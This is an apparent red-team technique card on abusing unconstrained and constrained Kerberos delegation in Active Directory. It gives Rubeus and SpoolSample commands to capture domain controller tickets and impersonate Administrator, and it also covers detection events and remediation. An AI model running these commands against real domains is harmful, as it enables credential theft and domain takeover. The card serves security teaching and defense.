# [PE-VALID-004]: Delegation Misconfiguration

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | PE-VALID-004 |
| **MITRE ATT&CK v18.1** | [Valid Accounts: Domain Accounts (T1078.002)](https://attack.mitre.org/techniques/T1078/002/) |
| **Tactic** | Privilege Escalation / Credential Access |
| **Platforms** | Windows AD |
| **Severity** | **High** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** This covers two main flaws:
    1.  **Unconstrained Delegation:** A computer/user with `TRUSTED_FOR_DELEGATION` stores the TGT of any user who connects to it in memory (LSASS). If a Domain Admin connects to an unconstrained server (e.g., via SpoolSample or managing it), the attacker can steal their TGT.
    2.  **Constrained Delegation:** If a user has `msDS-AllowedToDelegateTo` configured, they can impersonate *any* user to the listed SPNs (e.g., HOST/DC01) using S4U2self/S4U2proxy. If the target SPN allows protocol transition (S4U2self), no prior authentication is needed.
- **Attack Surface:** AD Delegation Settings.
- **Business Impact:** **Domain Compromise**.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Compromised Account with Delegation rights.
- **Tools:**
    - [Rubeus](https://github.com/GhostPack/Rubeus)
    - [SpoolSample](https://github.com/leechristensen/SpoolSample)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage (Unconstrained)
**Step 1: Monitor for TGTs**
```cmd
Rubeus.exe monitor /interval:5
```

**Step 2: Coerce Admin**
Force the DC to connect to the compromised server.
```cmd
SpoolSample.exe DC01 UnconstrainedServer
```

**Step 3: Export & Inject**
Use the captured TGT to DCSync.

#### 4.2 Usage (Constrained)
**Step 1: Request Ticket (S4U)**
Impersonate Administrator to the target service.
```cmd
Rubeus.exe s4u /user:ServiceAccount /rc4:HASH /impersonateuser:Administrator /msdsspn:time/DC01 /ptt
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 AD Logs
| Source | Event | Filter Logic |
|---|---|---|
| **Security** | 4769 | TGT Request. Look for `Transited Services` that shouldn't be there. |
| **Security** | 4624 | Logon Type 3 (Network). Authentication using a TGT issued via delegation (Forwardable flag). |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Remove Unconstrained:** Audit all computers with `TRUSTED_FOR_DELEGATION`. Replace with Constrained Delegation.
*   **Protected Users:** Add Admins to "Protected Users" group (prevents delegation entirely).
*   **Account is Sensitive:** Flag critical accounts as "Account is sensitive and cannot be delegated".

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-RECON-002]
> **Next Logical Step:** [CA-UNSC-001]
